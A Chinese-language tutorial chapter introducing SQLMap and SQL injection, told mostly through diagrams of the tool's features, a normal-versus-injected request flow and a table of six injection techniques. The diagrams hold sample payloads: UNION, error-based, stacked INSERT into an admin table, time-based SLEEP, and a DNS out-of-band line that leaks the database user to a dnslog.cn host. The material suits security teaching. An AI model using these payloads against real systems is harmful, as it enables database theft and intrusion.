# 第四章：SQLMap - SQL注入自动化工具

## 4.1 SQLMap 简介与注入原理

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss01" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss01g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s01dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss01g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss01dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-1 SQLMap 是什么：8 大能力一图看懂</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">开源 SQL 注入自动化之王，支持 18+ DBMS / 6 种注入技术 / 自动提权 os-shell</text>  <rect x="30" y="105" width="250" height="185" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="30" y="105" width="250" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="155.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 18+ 数据库</text>  <text x="155.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">MySQL/MariaDB、Oracle、P</text>  <text x="155.0" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">ostgreSQL、MSSQL、Access</text>  <text x="155.0" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">、SQLite、Firebird、Sybas</text>  <text x="155.0" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">e、SAP MaxDB、Informix、H</text>  <rect x="290" y="105" width="250" height="185" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="290" y="105" width="250" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="415.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">② 6 种注入技术</text>  <text x="415.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">布尔盲注、时间盲注、报错注入、UNION 查</text>  <text x="415.0" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">询、堆叠查询、外带 OOB(DNS/HTTP</text>  <text x="415.0" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">)</text>  <text x="415.0" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="550" y="105" width="250" height="185" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="550" y="105" width="250" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="675.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ 指纹识别</text>  <text x="675.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">自动识别 DBMS 类型/版本、操作系统、W</text>  <text x="675.0" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">eb 应用语言、WAF 类型/厂商</text>  <text x="675.0" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="675.0" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="810" y="105" width="250" height="185" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="810" y="105" width="250" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="935.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">④ 数据枚举</text>  <text x="935.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--dbs / --tables / --c</text>  <text x="935.0" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">olumns / --dump 自动导出全库</text>  <text x="935.0" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">全表账号密码</text>  <text x="935.0" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="30" y="300" width="250" height="185" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="30" y="300" width="250" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="155.0" y="320" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">⑤ 文件读写</text>  <text x="155.0" y="350" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--file-read / --file-w</text>  <text x="155.0" y="366" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">rite / --file-dest 读写任</text>  <text x="155.0" y="382" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">意文件（需权限）</text>  <text x="155.0" y="398" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="290" y="300" width="250" height="185" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="290" y="300" width="250" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="415.0" y="320" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ 命令执行</text>  <text x="415.0" y="350" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--os-cmd / --os-shell </text>  <text x="415.0" y="366" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">/ --os-pwn 直接拿系统交互 She</text>  <text x="415.0" y="382" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">ll 或 Meterpreter</text>  <text x="415.0" y="398" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="550" y="300" width="250" height="185" rx="10" fill="#0f172a" stroke="#06b6d4" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="550" y="300" width="250" height="30" rx="10" fill="#06b6d4" opacity="0.20"/>  <text x="675.0" y="320" text-anchor="middle" font-size="13" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">⑦ 哈希破解</text>  <text x="675.0" y="350" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--passwords 自动识别哈希类型，调</text>  <text x="675.0" y="366" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">用 Hashcat/John 在线破解账号哈</text>  <text x="675.0" y="382" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">希</text>  <text x="675.0" y="398" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="810" y="300" width="250" height="185" rx="10" fill="#0f172a" stroke="#ec4899" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="810" y="300" width="250" height="30" rx="10" fill="#ec4899" opacity="0.20"/>  <text x="935.0" y="320" text-anchor="middle" font-size="13" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">⑧ WAF 绕过</text>  <text x="935.0" y="350" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--tamper 50+ 脚本 + Leve</text>  <text x="935.0" y="366" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">l/Risk/Tor/代理/延迟/分块编码 </text>  <text x="935.0" y="382" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">绕过云 WAF</text>  <text x="935.0" y="398" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="30" y="505" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="521" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">GitHub: sqlmapproject/sqlmap · 最新版每周更新 · Kali 自带 = 省去安装烦恼</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss02" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss02g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s02dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss02g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss02dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-2 SQL 注入攻击原理图（正常请求 vs 注入请求）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">核心原理：用户输入未过滤，直接拼进 SQL 语句 → DB 执行恶意语句 → 返回攻击者想要的信息</text>  <rect x="50" y="100" width="980" height="140" rx="14" fill="#0b1530" stroke="#10b981" stroke-dasharray="6 4"/>  <text x="540" y="126" text-anchor="middle" font-size="14" font-weight="800" fill="#34d399" font-family="Microsoft YaHei,Arial">正常业务请求（无注入）  SELECT id,name,price FROM goods WHERE id = 2</text>  <rect x="60" y="145" width="200" height="80" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="60" y="145" width="200" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="160.0" y="165" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">浏览器</text>  <text x="160.0" y="195" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">GET /goods?id=2
【用户输入 </text>  <text x="160.0" y="211" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">&quot;2&quot; 整数】</text>  <rect x="320" y="145" width="200" height="80" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="320" y="145" width="200" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="420.0" y="165" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">Web 服务器</text>  <text x="420.0" y="195" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">PHP/JAVA 拼接 SQL
$sql =</text>  <text x="420.0" y="211" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"> &quot;SELECT * FROM goods WHERE id=&quot;.$_GET['id']</text>  <rect x="580" y="145" width="200" height="80" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="580" y="145" width="200" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="680.0" y="165" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">DB 数据库</text>  <text x="680.0" y="195" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">执行正常 SQL
返回商品 3 列：id=2</text>  <text x="680.0" y="211" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">, name=xx, price=99</text>  <rect x="840" y="145" width="200" height="80" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="840" y="145" width="200" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="940.0" y="165" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">浏览器</text>  <text x="940.0" y="195" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">显示正常商品页
无任何敏感信息泄露</text>  <text x="940.0" y="211" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <defs><marker id="a260185320185" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="260" y1="185" x2="320" y2="185" stroke="#60a5fa" stroke-width="2" marker-end="url(#a260185320185)"/>  <defs><marker id="a520185580185" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="520" y1="185" x2="580" y2="185" stroke="#60a5fa" stroke-width="2" marker-end="url(#a520185580185)"/>  <defs><marker id="a780185840185" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="780" y1="185" x2="840" y2="185" stroke="#60a5fa" stroke-width="2" marker-end="url(#a780185840185)"/>  <rect x="50" y="270" width="980" height="210" rx="14" fill="#0b1530" stroke="#ef4444"/>  <text x="540" y="296" text-anchor="middle" font-size="14" font-weight="800" fill="#fca5a5" font-family="Microsoft YaHei,Arial">注入攻击请求   id=2' UNION SELECT user(), database(), version() -- -</text>  <rect x="60" y="315" width="200" height="150" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="60" y="315" width="200" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="160.0" y="335" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">攻击者</text>  <text x="160.0" y="365" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">GET /goods?id=2' AND 1</text>  <text x="160.0" y="381" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">=2
 UNION SELECT
 user</text>  <text x="160.0" y="397" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">(),database(),
 version()-- -</text>  <rect x="320" y="315" width="200" height="150" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="320" y="315" width="200" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="420.0" y="335" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">Web 服务器</text>  <text x="420.0" y="365" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">无过滤直接拼接 →
SELECT * FRO</text>  <text x="420.0" y="381" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">M goods WHERE id=2' 
U</text>  <text x="420.0" y="397" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">NION SELECT user(),db(),version()-- -</text>  <rect x="580" y="315" width="200" height="150" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="580" y="315" width="200" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="680.0" y="335" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">DB 数据库</text>  <text x="680.0" y="365" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">执行 2 条 SELECT！
正常空 + 恶</text>  <text x="680.0" y="381" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">意 3 列：
root@localhost,</text>  <text x="680.0" y="397" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"> cisp, 8.0.35</text>  <rect x="840" y="315" width="200" height="150" rx="10" fill="#0f172a" stroke="#fde047" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="840" y="315" width="200" height="30" rx="10" fill="#fde047" opacity="0.20"/>  <text x="940.0" y="335" text-anchor="middle" font-size="13" font-weight="800" fill="#fde047" font-family="Microsoft YaHei,Arial">攻击者</text>  <text x="940.0" y="365" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">页面输出敏感信息！
DB账号/库名/版本
=</text>  <text x="940.0" y="381" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"> 进一步 dump 全库！</text>  <text x="940.0" y="397" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <defs><marker id="a260390320390" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#ef4444"/></marker></defs>  <line x1="260" y1="390" x2="320" y2="390" stroke="#ef4444" stroke-width="2" marker-end="url(#a260390320390)"/>  <defs><marker id="a520390580390" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#ef4444"/></marker></defs>  <line x1="520" y1="390" x2="580" y2="390" stroke="#ef4444" stroke-width="2" marker-end="url(#a520390580390)"/>  <defs><marker id="a780390840390" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#ef4444"/></marker></defs>  <line x1="780" y1="390" x2="840" y2="390" stroke="#ef4444" stroke-width="2" marker-end="url(#a780390840390)"/>  <rect x="30" y="505" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="521" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">注入本质 = 数据层边界失控：用户输入从『数据』变成『可执行代码』</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss03" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss03g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s03dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss03g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss03dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-3 SQLMap 6 种注入技术对比总表（一张表选对注入模式）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">优先顺序：UNION &gt; 报错 &gt; 堆叠 &gt; 布尔 &gt; 时间 &gt; OOB（速度从快到慢）</text>  <rect x="60" y="108" width="220" height="32" fill="#1e293b" stroke="#6366f1"/>  <text x="170.0" y="129" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="800" font-family="Microsoft YaHei,Arial">注入类型 / 参数</text>  <rect x="290" y="108" width="160" height="32" fill="#1e293b" stroke="#6366f1"/>  <text x="370.0" y="129" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="800" font-family="Microsoft YaHei,Arial">--technique 开关</text>  <rect x="460" y="108" width="110" height="32" fill="#1e293b" stroke="#6366f1"/>  <text x="515.0" y="129" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="800" font-family="Microsoft YaHei,Arial">速度（字符/秒）</text>  <rect x="580" y="108" width="180" height="32" fill="#1e293b" stroke="#6366f1"/>  <text x="670.0" y="129" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="800" font-family="Microsoft YaHei,Arial">触发必须条件</text>  <rect x="770" y="108" width="270" height="32" fill="#1e293b" stroke="#6366f1"/>  <text x="905.0" y="129" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="800" font-family="Microsoft YaHei,Arial">Payload 一句话示例</text>  <rect x="60" y="140" width="220" height="62" fill="#111c35" stroke="#334155"/>  <rect x="290" y="140" width="160" height="62" fill="#111c35" stroke="#334155"/>  <rect x="460" y="140" width="110" height="62" fill="#111c35" stroke="#334155"/>  <rect x="580" y="140" width="180" height="62" fill="#111c35" stroke="#334155"/>  <rect x="770" y="140" width="270" height="62" fill="#111c35" stroke="#334155"/>  <text x="68" y="166" font-size="12" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">UNION-based 联合查询</text>  <text x="370.0" y="166" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">--technique U</text>  <text x="515.0" y="160" text-anchor="middle" font-size="11" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">★★★★★</text>  <text x="515.0" y="178" text-anchor="middle" font-size="10" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">快</text>  <text x="588" y="159" font-size="10" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">有回显且列数相同</text>  <text x="778" y="159" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">ORDER BY 猜列数 → UNION SELECT NU</text>  <text x="778" y="173" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">LL,NULL,NULL,3--</text>  <rect x="60" y="202" width="220" height="62" fill="#0b1530" stroke="#334155"/>  <rect x="290" y="202" width="160" height="62" fill="#0b1530" stroke="#334155"/>  <rect x="460" y="202" width="110" height="62" fill="#0b1530" stroke="#334155"/>  <rect x="580" y="202" width="180" height="62" fill="#0b1530" stroke="#334155"/>  <rect x="770" y="202" width="270" height="62" fill="#0b1530" stroke="#334155"/>  <text x="68" y="228" font-size="12" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">Error-based 报错注入</text>  <text x="370.0" y="228" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">--technique E</text>  <text x="515.0" y="222" text-anchor="middle" font-size="11" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">★★★★</text>  <text x="515.0" y="240" text-anchor="middle" font-size="10" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">快</text>  <text x="588" y="221" font-size="10" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">有报错输出 &amp; DB 特殊函数</text>  <text x="778" y="221" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">AND extractvalue(1,concat(0x7e</text>  <text x="778" y="235" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">,user(),0x7e))</text>  <rect x="60" y="264" width="220" height="62" fill="#111c35" stroke="#334155"/>  <rect x="290" y="264" width="160" height="62" fill="#111c35" stroke="#334155"/>  <rect x="460" y="264" width="110" height="62" fill="#111c35" stroke="#334155"/>  <rect x="580" y="264" width="180" height="62" fill="#111c35" stroke="#334155"/>  <rect x="770" y="264" width="270" height="62" fill="#111c35" stroke="#334155"/>  <text x="68" y="290" font-size="12" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">Stacked Queries 堆叠</text>  <text x="370.0" y="290" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">--technique S</text>  <text x="515.0" y="284" text-anchor="middle" font-size="11" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">★★★★</text>  <text x="515.0" y="302" text-anchor="middle" font-size="10" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">快</text>  <text x="588" y="283" font-size="10" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">驱动支持多语句(;)</text>  <text x="778" y="283" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">; INSERT INTO admin VALUES('x'</text>  <text x="778" y="297" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">,'x')-- -</text>  <rect x="60" y="326" width="220" height="62" fill="#0b1530" stroke="#334155"/>  <rect x="290" y="326" width="160" height="62" fill="#0b1530" stroke="#334155"/>  <rect x="460" y="326" width="110" height="62" fill="#0b1530" stroke="#334155"/>  <rect x="580" y="326" width="180" height="62" fill="#0b1530" stroke="#334155"/>  <rect x="770" y="326" width="270" height="62" fill="#0b1530" stroke="#334155"/>  <text x="68" y="352" font-size="12" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">Boolean-based 布尔盲注</text>  <text x="370.0" y="352" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">--technique B</text>  <text x="515.0" y="346" text-anchor="middle" font-size="11" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">★★</text>  <text x="515.0" y="364" text-anchor="middle" font-size="10" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">慢</text>  <text x="588" y="345" font-size="10" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">页面有真/假两种差异</text>  <text x="778" y="345" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">AND 1=1 / AND 1=2 → 二分猜 ASCII</text>  <rect x="60" y="388" width="220" height="62" fill="#111c35" stroke="#334155"/>  <rect x="290" y="388" width="160" height="62" fill="#111c35" stroke="#334155"/>  <rect x="460" y="388" width="110" height="62" fill="#111c35" stroke="#334155"/>  <rect x="580" y="388" width="180" height="62" fill="#111c35" stroke="#334155"/>  <rect x="770" y="388" width="270" height="62" fill="#111c35" stroke="#334155"/>  <text x="68" y="414" font-size="12" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">Time-based 时间盲注</text>  <text x="370.0" y="414" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">--technique T</text>  <text x="515.0" y="408" text-anchor="middle" font-size="11" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">★</text>  <text x="515.0" y="426" text-anchor="middle" font-size="10" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">极慢</text>  <text x="588" y="407" font-size="10" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">无回显但能 SLEEP()</text>  <text x="778" y="407" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">AND SLEEP(5) → 响应延迟 5 秒=真</text>  <rect x="60" y="450" width="220" height="62" fill="#0b1530" stroke="#334155"/>  <rect x="290" y="450" width="160" height="62" fill="#0b1530" stroke="#334155"/>  <rect x="460" y="450" width="110" height="62" fill="#0b1530" stroke="#334155"/>  <rect x="580" y="450" width="180" height="62" fill="#0b1530" stroke="#334155"/>  <rect x="770" y="450" width="270" height="62" fill="#0b1530" stroke="#334155"/>  <text x="68" y="476" font-size="12" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">Out-of-band 外带注入</text>  <text x="370.0" y="476" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">--technique O</text>  <text x="515.0" y="470" text-anchor="middle" font-size="11" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">★★★</text>  <text x="515.0" y="488" text-anchor="middle" font-size="10" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">中</text>  <text x="588" y="469" font-size="10" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">能发起 DNS/HTTP 请求</text>  <text x="778" y="469" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">AND LOAD_FILE(CONCAT('\\\\',us</text>  <text x="778" y="483" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">er(),'.dnslog.cn\\a')) → DNSLo</text>  <rect x="30" y="510" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="526" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">推荐默认：--technique=BEUST（O 单独用需配合 DNSLog 平台），顺序即优先顺序</text>
</svg>

### 什么是SQL注入？

想象你是一个商店收银员，顾客给你一张纸条写着"给我商品编号为1的商品"。你按照纸条的内容执行：
```
SELECT * FROM products WHERE id = 1
```

